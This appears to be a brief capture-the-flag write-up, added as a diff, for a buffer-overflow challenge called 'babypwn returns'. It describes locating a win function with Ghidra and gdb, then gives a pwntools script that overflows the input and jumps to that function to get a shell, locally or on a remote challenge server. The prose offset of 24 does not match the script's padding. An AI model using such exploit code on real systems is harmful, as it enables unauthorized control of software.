@@ -1,0 +1,34 @@
+the challenge is to get control of the shell
+
+on downlaoding the binary and inspecting through ghidra
+we get that there is a win funciton which needs to be executed and normally not executed
+
+we get that there is an offset of 24 on trying several values then 
+
+go to gdb and do disassemble win which will give you address of win 
+
+use checksec binary to figure out what kind of processor it is like 64bit or 32-bit
+then use pwntools to connect and send "A"*24 + p64(WIN_ADDRESS) this will get you a shell
+
+WIN_ADDRESS can be used in python if a binary is used will make life easier
+
+by using ELF function
+
+Here is the program for babypwn returns
+
+from pwn import * 
+
+binary = context.binary = ELF('./Downloads/chall2')
+
+
+if not args.REMOTE:
+    p = process(binary.path)
+else:
+    p = remote('35.226.73.105', 1337)
+payload=b'h4rdw0rk1337\0' + b'a'*59 + p64(binary.sym.win)
+# p.recvuntil('AAAd\n')
+p.recv()
+p.sendline(payload)
+p.interactive()
+
+print(payload)% 
